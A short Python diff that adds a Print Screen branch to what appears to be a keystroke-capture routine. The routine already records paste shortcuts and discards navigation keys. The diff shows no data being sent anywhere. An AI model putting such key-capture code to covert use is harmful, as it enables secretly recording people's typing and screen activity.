@@ -21,6 +21,9 @@ def keystroke(key):
     if key == "\\x16":
         key = "\nshortcut Paste\n"
         capturekey("_Paste")
+    if key == "Key.print_screen ":
+        key = "\nprint screen\n"
+        capturekey("_capture")
     if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
         key = ''
     else:
